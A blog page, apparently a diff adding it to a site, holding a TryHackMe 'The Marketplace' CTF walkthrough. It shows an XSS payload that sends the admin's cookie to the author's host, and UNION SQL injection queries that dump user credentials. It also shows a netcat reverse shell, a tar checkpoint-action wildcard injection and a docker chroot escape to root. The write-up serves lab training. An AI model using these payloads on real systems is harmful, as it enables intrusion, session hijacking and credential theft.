@@ -1,0 +1,1221 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="This is my personal website. The purpose of the Website is to assist and monitor my own development.">
+<meta name="google-site-verification" content="NeMnHGyDeeJqt9s_pg03TI1foYUOvLwrHreqLj_mgRE">
+<meta name="language" content="en">
+
+<!-- Twitter And Open Graph Meta -->
+<!-- Open Graph Meta Tags -->
+<meta property="og:title" content="TryHackMe - The Marketplace">
+<meta property="og:type" content="Article">
+<meta property="og:url" content="http://localhost:4000/tryhackme-the-marketplace/">
+<meta name="image" property="og:image" content="/assets/img/avatar.jpg">
+<meta property="og:image:alt" content="">
+<meta property="og:site_name" content="Mr0Wido's Blog">
+<meta property="og:locale" content="en_US">
+
+<!-- Twitter Meta Tags -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="@">
+<meta name="twitter:title" content="TryHackMe - The Marketplace">
+<meta name="twitter:image" content="/assets/img/avatar.jpg">
+
+
+
+<!-- css -->
+<link rel="shortcut icon" href="/assets/img/favicon.ico" type="ico">
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<link rel="canonical" href="/tryhackme-the-marketplace/">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+<title>TryHackMe - The Marketplace - Mr0Wido's Blog</title>
+
+
+
+<!-- Script -->
+<script src="https://unpkg.com/simple-jekyll-search@latest/dest/simple-jekyll-search.min.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+<script src="https://kit.fontawesome.com/d54796acd1.js" crossorigin="anonymous"></script>
+
+
+
+
+
+    <title>TryHackMe - The Marketplace - Mr0Wido's Blog</title>
+    <link rel="stylesheet" type="text/css" href="/assets/css/main.css">
+  </head>
+  <body>
+    <header class="site-header">
+  <a class="site-logo" href="/"> <img src="/assets/img/icon-4.png" alt="logo"></a>
+  <div class="site-title">
+    <a href="http://localhost:4000">Mr0Wido's Blog</a>
+  </div>
+  <nav class="site-nav">
+    <ul class="site-nav__list">
+      <li class="site-nav__item">
+        <a class="site-nav__link " href="/">Home</a>
+      </li>
+      <li class="site-nav__item">
+        <a class="site-nav__link " href="/whoami/">Whoami</a>
+      </li>
+      <li class="site-nav__item">
+        <a class="site-nav__link " href="/posts/">Posts</a>
+      </li>
+      <li class="site-nav__item">
+        <a class="site-nav__link " href="/projects/">Projects</a>
+      </li>
+      <li class="site-nav__item">
+        <a class="site-nav__link " href="/cv/">CV</a>
+      </li>
+      <li class="site-nav__item">
+        <a class="site-nav__link " href="/categories/">Categories</a>
+      </li>
+      <li class="site-nav__item">
+        <div class="search">
+          <input type="text" id="search-input" placeholder="Search...">
+          <i class="fas fa-search"></i>
+          <ul id="results-container"></ul>
+        </div>
+      </li>
+    </ul>
+  </nav>
+</header>
+
+
+<!-- 360 to 980 -->
+<header class="header-mobile">
+  <div class="header-inner clearfix">
+    <div class="nav-btn nav-slider">
+      <i class="fa-solid fa-bars"></i>
+    </div>
+    <a class="site-logo" href="/"> <img src="/assets/img/icon-4.png" alt="logo"></a>
+    <div class="site-title">
+      <a href="http://localhost:4000">Mr0Wido's Blog</a>
+    </div>
+  </div>
+</header>
+<nav class="sidebar">
+  <div class="nav-header">
+    <div class="nav-search">
+      <div class="search">
+        <i class="fas fa-search"></i>
+        <input type="search" name="search" id="search-input" placeholder="Search...">
+        <ul id="results-container"></ul>
+      </div>
+    </div>
+  </div>
+  <ul class="nav-categories ul-base">
+    <li><a class="site-nav__link " href="/">Home</a></li>
+    <li><a class="site-nav__link " href="/whoami/">Whoami</a></li>
+    <li><a class="site-nav__link " href="/posts/">Posts</a></li>
+    <li><a class="site-nav__link " href="/projects/">Projects</a></li>
+    <li><a class="site-nav__link " href="/cv/">CV</a></li>
+    <li><a class="site-nav__link " href="/categories/">Categories</a></li>
+  </ul>
+  <ul class="social ul-base">
+    <li><a href="https://twitter.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i></a></li>
+    <li><a href="https://instagram.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i></a></li>
+    <li><a href="https://www.linkedin.com/in/" itemprop="sameAs" rel="nofollow noopener noreferrer me" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i></a></li>
+    <li><a href="https://github.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i></a></li>
+  </ul>
+  <div class="copyright">
+    <span> © Copyright 2023 Mr0Wido's Blog | Powered by Jekyll | <a href="/tos/">Terms of Service</a> | <a href="/disclaimer/">Disclaimer</a></span>
+  </div>
+</nav>
+<div class="overlay"></div>
+    
+    <div class="container-default">
+      <div class="content-container">
+        <main class="default">
+          <div class="post">
+  <h1 class="post__title">TryHackMe - The Marketplace</h1>
+  <div class="post__content">
+    <p>Can you take over The Marketplace’s infrastructure?</p>
+
+<p>This is a medium level machine and looking at the tags we will be focusing on web, xss, docker and sqli.</p>
+
+<p>The sysadmin of The Marketplace, Michael, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. He said it still has a few bugs he and his team need to iron out.</p>
+
+<p>Can you take advantage of this and will you be able to gain root access on his server?</p>
+
+<p>Created by <a href="https://tryhackme.com/p/jammy" rel="external nofollow noopener" target="_blank">jammy</a></p>
+
+<p><br></p>
+
+<h3 id="1-what-is-flag-1">1. What is flag 1?</h3>
+
+<p>Let’s do a <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.171.214
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/marketplace/nmap.png" alt="nmap"></p>
+
+<p>Three ports are open. These are <code class="language-plaintext highlighter-rouge">22/tcp SSH, 80/tcp HTTP, 32768/tcp HTTP</code></p>
+
+<p>Let’s visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>
+
+<p>Here is a homepage.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/home.png" alt="home"></p>
+
+<p>There are also <code class="language-plaintext highlighter-rouge">login</code> and <code class="language-plaintext highlighter-rouge">signup</code> pages.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/login.png" alt="login"></p>
+
+<p>I register as <code class="language-plaintext highlighter-rouge">new:new</code> on the sign up page.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/signup.png" alt="signup"></p>
+
+<p>After that, when I log in, two new pages appear.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/new-pages.png" alt="new-pages"></p>
+
+<p>Let’s go to the <code class="language-plaintext highlighter-rouge">new-listing</code> page.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/new-listing.png" alt="new-listing"></p>
+
+<p>I can write something on this page and upload it to the system. As far as I understand, what I write is directly saved in the database. So maybe we can access the database from here.</p>
+
+<p>The message page is as follows.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/messages.png" alt="messages"></p>
+
+<p>I’m checking the <code class="language-plaintext highlighter-rouge">robots.txt</code> page.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/robots.png" alt="robots"></p>
+
+<p>I see the <code class="language-plaintext highlighter-rouge">/admin</code> page is accessible.</p>
+
+<p>Let’s go to the admin page.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/admin-error.png" alt="admin-error"></p>
+
+<p>I ran a <code class="language-plaintext highlighter-rouge">gobuster</code> scan at this point, but nothing useful came up. I tried <code class="language-plaintext highlighter-rouge">SQLi</code> using <code class="language-plaintext highlighter-rouge">sqlmap</code> on the login page, but it didn’t work either.</p>
+
+<p>Then I decided to try <code class="language-plaintext highlighter-rouge">XSS</code> on the <code class="language-plaintext highlighter-rouge">New-listing</code> page.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/xss1.png" alt="xss1"></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ &lt;script&gt;alert('Mr0Wido')&lt;/script&gt;
+</code></pre></div></div>
+
+<p>Yes, it did work.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/xss2.png" alt="xss2"></p>
+
+<p>There seems to be an <code class="language-plaintext highlighter-rouge">XSS vulnerability</code>. And maybe with the XSS vulnerability, we can access the cookies of the admin user.</p>
+
+<p>But I still have doubts about how to do this somehow the admin user needs to interact.</p>
+
+<p>I’ve been wandering around the site a little more and this catches my attention.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/report.png" alt="report"></p>
+
+<p>In other words, we can report the list we created to the admin. So The admin will review the report we sent and click on the payload that we will upload. This means that we may have the cookies of the admin user.</p>
+
+<p>Let ‘s do it.</p>
+
+<p>So ı found this GitHub repository for stealing cookies. <a href="https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md" rel="external nofollow noopener" target="_blank">Steal Cookies with Reflected XSS</a>. <strong><code class="language-plaintext highlighter-rouge">(It's don't working.)</code></strong></p>
+
+<p>The page says there is a python script that steals cookies, we need to run it first. <a href="https://github.com/lnxg33k/misc/blob/master/XSS-cookie-stealer.py" rel="external nofollow noopener" target="_blank">lnxg33k’s cookie stealer script</a></p>
+
+<p>Then our payload code is as follows:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;
+alert(document.cookie);
+var i=new Image;
+i.src="http://&lt;your-ip&gt;:8888/?"+document.cookie;
+&lt;/script&gt;
+</code></pre></div></div>
+
+<p>The python script above didn’t work for me and I edited the script again. <a href="https://github.com/Mr0Wido/xss-cookie-stealer-python-script" rel="external nofollow noopener" target="_blank">Reformed XSS Cookie Stealer Python Script</a>
+Let’s try.</p>
+
+<p>Let’s run the script first.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/script1.png" alt="script1"></p>
+
+<p>Now let’s <code class="language-plaintext highlighter-rouge">create a New-listing</code>.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/payload.png" alt="payload"></p>
+
+<p>The payload we created.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/report2.png" alt="report2"></p>
+
+<p>Now let’s get the admin’s cookie by reporting the payload we created.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/report1.png" alt="report1"></p>
+
+<p><img src="/assets/img/tryhackme/marketplace/messages.png" alt="messages"></p>
+
+<p>Yes, it worked.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/script2.png" alt="script2"></p>
+
+<p>The top token is for my user and the bottom is for the admin user.</p>
+
+<p>Let’s go to the site and exchange it for our own token.</p>
+
+<p>For <code class="language-plaintext highlighter-rouge">Firefox</code>, we will change the cookie part in <code class="language-plaintext highlighter-rouge">Right-click &gt; Inspect &gt; Storage</code>.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/change.png" alt="change"></p>
+
+<p>And when we <code class="language-plaintext highlighter-rouge">refresh the page</code>, we can now <code class="language-plaintext highlighter-rouge">access the admin</code>.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/admin.png" alt="admin"></p>
+
+<p>As you will see here, there are some users and their ids.</p>
+
+<p><code class="language-plaintext highlighter-rouge">1:system - 2:michael - 3:jake</code></p>
+
+<p>Others are users that I created. I’m working a little messy <image class="emoji" title="grin" alt="😁" src="https://github.githubassets.com/images/icons/emoji/unicode/1f601.png?v8" style="vertical-align: middle;             max-width: 1em; visibility: hidden;" onload="this.style.visibility='visible'" onerror="this.replaceWith(this.alt)">           </image></p>
+
+<p><br></p>
+
+<h3 id="2-what-is-flag-2-usertxt">2. What is flag 2? (User.txt)</h3>
+
+<p>It’s obvious that there is an <code class="language-plaintext highlighter-rouge">SQLi vulnerability</code> here, but let’s verify it anyway.</p>
+
+<p>I click on <code class="language-plaintext highlighter-rouge">Michael</code> whose id is 2 and write <code class="language-plaintext highlighter-rouge">2-1</code> instead of user=2 in the URL.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/detect.png" alt="detect"></p>
+
+<p>And as you can see it returned to the system user with id 1.</p>
+
+<p>We have confirmed the existence of the SQLi vulnerability.</p>
+
+<p>To find out the number of columns, I proceed as follows, increasing one at a time.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,2,3,4,5--
+</code></pre></div></div>
+
+<p>When I get to the last 5, I get the following error.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/error_column.png" alt="error_column"></p>
+
+<p>So we can go up to 4.</p>
+
+<p>Let’s get the information from the database.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(schema_name),3,4 FROM information_scheam.schemata-- 
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/marketplace/schemata.png" alt="schemata"></p>
+
+<p>I continue from the <code class="language-plaintext highlighter-rouge">marketplace</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(table_name),3,4 FROM information_scheam.tables WHERE table_schema='marketplace'-- 
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/marketplace/tables.png" alt="tables"></p>
+
+<p>There are two important tables, one is <code class="language-plaintext highlighter-rouge">messages</code> and the other is <code class="language-plaintext highlighter-rouge">users</code>.
+First I look at the <code class="language-plaintext highlighter-rouge">messages table</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(column_name),3,4 FROM information_scheam.columns WHERE table_name='messages'-- 
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/marketplace/column-messages.png" alt="column-messages"></p>
+
+<p>Let’s dump the <code class="language-plaintext highlighter-rouge">contents of the messages</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(id,'~~',message_content,'~~',user_from,'~~',user_to),3,4 FROM messages-- 
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/marketplace/content-messages.png" alt="content-messages"></p>
+
+<p>It seems that the user whose id is 1, is the system. The system sent a message to Jake, and the <code class="language-plaintext highlighter-rouge">message includes Jake's ssh password</code>. Let’s keep this information in our pocket now. And let’s go to the users table.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(column_name),3,4 FROM information_scheam.columns WHERE table_name='users'-- 
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/marketplace/users.png" alt="users"></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(id,'~',username,'~',password),3,4 FROM users-- 
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/marketplace/passwords.png" alt="passwords"></p>
+
+<p>I can try to crack these passwords, but first I want to check if the password I found for Jake works. If it doesn’t work, we continue from here.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh jake@10.10.171.214
+</code></pre></div></div>
+
+<p>Yes it worked. We are inside.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/jake.png" alt="jake"></p>
+
+<p>Let’s get the <code class="language-plaintext highlighter-rouge">user flag</code>.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/user-flag.png" alt="user-flag"></p>
+
+<p><br></p>
+
+<h3 id="3-what-is-flag-3-roottxt">3. What is flag 3? (Root.txt)</h3>
+
+<p>Let’s try the <code class="language-plaintext highlighter-rouge">sudo -l</code> command.</p>
+
+<p>And ther it is.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/sduol.png" alt="sduol"></p>
+
+<p>We can run <code class="language-plaintext highlighter-rouge">/opt/backups/backup.sh</code> as Michael. Without requiring a password.</p>
+
+<p>Let’s see what’s in it.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/backup-sh.png" alt="backup-sh"></p>
+
+<p>I couldn’t find how to upgrade permissions. When I started researching, I found a way. Let’s try.</p>
+
+<p>First I go to <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="external nofollow noopener" target="_blank">Pentestmonkey Reverse Shell Cheat Sheet</a>. And for netcat, I choose:</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/nc.png" alt="nc"></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
+</code></pre></div></div>
+
+<p>Now I’m setting up a <code class="language-plaintext highlighter-rouge">netcat</code> listener on my own machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 5555
+</code></pre></div></div>
+
+<p>Then I run the following codes in order.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cd /opt/backups
+$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.86.168 5555 &gt;/tmp/f" &gt; shell.sh
+$ echo "" &gt; "--checkpoint-action=exec=sh shell.sh"
+$ echo "" &gt; --checkpoint=1
+$ chmod 777 backup.tar shell.sh
+$ sudo -u michael ./backup.sh
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/marketplace/backups.png" alt="backups"></p>
+
+<p>And we’re in.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/michael-in.png" alt="michael-in"></p>
+
+<p>HUH! <code class="language-plaintext highlighter-rouge">999(docker)</code>. It’s interesting.</p>
+
+<p>I’m looking at <a href="https://gtfobins.github.io/gtfobins/docker/" rel="external nofollow noopener" target="_blank">GTFOBins</a> to see if I can find anything about docker.</p>
+
+<p>Let’s try this.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/gtf.png" alt="gtf"></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -c 'import pty; pty.spawn("/bin/bash")'
+$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+</code></pre></div></div>
+
+<p>And we are <code class="language-plaintext highlighter-rouge">root</code>.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/rootin.png" alt="rootin"></p>
+
+<p>Let’s get the <code class="language-plaintext highlighter-rouge">root flag</code>.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/root-flag.png" alt="root-flag"></p>
+
+<p><br></p>
+
+<p>It was nice CTF. I hope you learned something and had fun. But that’s it for now till next time take care <image class="emoji" title="wave" alt="👋" src="https://github.githubassets.com/images/icons/emoji/unicode/1f44b.png?v8" style="vertical-align: middle;             max-width: 1em; visibility: hidden;" onload="this.style.visibility='visible'" onerror="this.replaceWith(this.alt)">           </image></p>
+
+<p><br></p>
+
+  </div>
+  <div class="post__footer">
+    <p class="post__date">
+      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  May 11, 2023</p>
+    <div class="post__categories">
+      
+      
+      <p><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: <a href="/categories/#TryHackMe">TryHackMe</a></p>
+            
+    </div>      
+    
+    <div class="post__tags">
+      <p class="post__tags-title">
+        <span class="post__tags__title"><i class="fas fa-fw fa-tags" aria-hidden="true"></i>Tags: </span>
+        <span class="post__tags-container">
+          
+          <span class="post__tags-item">sqli, xss, docker</span>
+          
+        </span>
+      </p>
+    </div>
+    
+  </div>
+</div>
+<br>
+<!-- Twitter Share Button -->
+<a href="https://twitter.com/intent/tweet?text=TryHackMe%20-%20The%20Marketplace&amp;url=http://localhost:4000/tryhackme-the-marketplace/&amp;via=Mr0Wido" target="_blank" rel="noopener noreferrer" class="share-btn tweet-btn" title="Share on Twitter">
+    Tweet
+</a>
+  
+<!-- LinkedIn Share Button -->
+<a href="https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/tryhackme-the-marketplace/" target="_blank" rel="noopener noreferrer" class="share-btn" title="Share on LinkedIn">
+    LinkedIn
+</a>
+  
+  
+
+<br>
+
+
+<div id="disqus_thread"></div>
+<script>
+    var disqus_config = function () {
+    this.page.url = 'http://localhost:4000/tryhackme-the-marketplace/';
+    this.page.identifier = '/tryhackme-the-marketplace';
+    
+    };
+
+    (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://mr0widos-blog.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="external nofollow noopener" target="_blank">comments powered by Disqus.</a>
+</noscript>
+
+
+
+        </main>
+      </div>
+      <div class="author-container">
+        
+
+
+<div itemscope itemtype="https://schema.org/Person" class="author-card">
+
+  
+    <div class="author__avatar">
+        <img src="/assets/img/avatar.jpg" alt="Mr0Wido's Blog" itemprop="image" class="u-photo">
+    </div>
+  
+  <div class="author__content-head">
+    <div class="author__content">
+      <h3 class="author__name p-name" itemprop="name">
+        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
+      </h3>
+      
+        <div class="author__bio p-note" itemprop="description">
+          <p>I am an avid CTF player. I am interested in everything related to technology. I enjoy my time working with computers. Self and constant learner.</p>
+
+        </div>
+      
+    </div>
+  
+    <div class="author__urls-wrapper">
+      <ul class="author__urls social-icons">
+        
+          
+            
+              <li><a href="https://mr0wido.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
+            
+          
+            
+              <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+            
+          
+            
+              <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+            
+          
+            
+              <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
+            
+          
+            
+              <li><a href="https://www.linkedin.com/in/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+            
+          
+        
+  
+        
+  
+        
+          <li>
+            <a href="mailto:mr0wido@protonmail.com" rel="me" class="u-email">
+              <meta itemprop="email" content="mr0wido@protonmail.com">
+              <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
+            </a>
+          </li>
+        
+  
+        
+  
+        
+  
+        
+  
+        
+  
+        
+  
+        
+  
+        
+  
+        <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+      </ul>
+    </div>
+  </div>
+  <div class="author__content-head-medium">
+    <div class="author__content">
+      <h3 class="author__name p-name" itemprop="name">
+        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
+      </h3>
+      
+        <div class="author__bio p-note" itemprop="description">
+          <p>I am an avid CTF player. I am interested in everything related to technology. I enjoy my time working with computers. Self and constant learner.</p>
+
+        </div>
+      
+      <div class="author__urls-wrapper">
+        <ul class="author__urls social-icons">
+          
+            
+              
+                <li><a href="https://mr0wido.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
+              
+            
+              
+                <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+              
+            
+              
+                <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+              
+            
+              
+                <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
+              
+            
+              
+                <li><a href="https://www.linkedin.com/in/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+              
+            
+          
+    
+          
+    
+          
+            <li>
+              <a href="mailto:mr0wido@protonmail.com" rel="me" class="u-email">
+                <meta itemprop="email" content="mr0wido@protonmail.com">
+                <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
+              </a>
+            </li>
+          
+    
+          
+    
+          
+    
+          
+    
+          
+    
+          
+    
+          
+    
+          
+    
+          <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+        </ul>
+      </div>
+    </div>
+  
+
+  </div>
+</div>
+
+      </div>
+    </div>
+
+    <div class="container-medium">
+      <div class="author-container">
+        
+
+
+<div itemscope itemtype="https://schema.org/Person" class="author-card">
+
+  
+    <div class="author__avatar">
+        <img src="/assets/img/avatar.jpg" alt="Mr0Wido's Blog" itemprop="image" class="u-photo">
+    </div>
+  
+  <div class="author__content-head">
+    <div class="author__content">
+      <h3 class="author__name p-name" itemprop="name">
+        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
+      </h3>
+      
+        <div class="author__bio p-note" itemprop="description">
+          <p>I am an avid CTF player. I am interested in everything related to technology. I enjoy my time working with computers. Self and constant learner.</p>
+
+        </div>
+      
+    </div>
+  
+    <div class="author__urls-wrapper">
+      <ul class="author__urls social-icons">
+        
+          
+            
+              <li><a href="https://mr0wido.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
+            
+          
+            
+              <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+            
+          
+            
+              <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+            
+          
+            
+              <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
+            
+          
+            
+              <li><a href="https://www.linkedin.com/in/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+            
+          
+        
+  
+        
+  
+        
+          <li>
+            <a href="mailto:mr0wido@protonmail.com" rel="me" class="u-email">
+              <meta itemprop="email" content="mr0wido@protonmail.com">
+              <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
+            </a>
+          </li>
+        
+  
+        
+  
+        
+  
+        
+  
+        
+  
+        
+  
+        
+  
+        
+  
+        <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+      </ul>
+    </div>
+  </div>
+  <div class="author__content-head-medium">
+    <div class="author__content">
+      <h3 class="author__name p-name" itemprop="name">
+        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
+      </h3>
+      
+        <div class="author__bio p-note" itemprop="description">
+          <p>I am an avid CTF player. I am interested in everything related to technology. I enjoy my time working with computers. Self and constant learner.</p>
+
+        </div>
+      
+      <div class="author__urls-wrapper">
+        <ul class="author__urls social-icons">
+          
+            
+              
+                <li><a href="https://mr0wido.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
+              
+            
+              
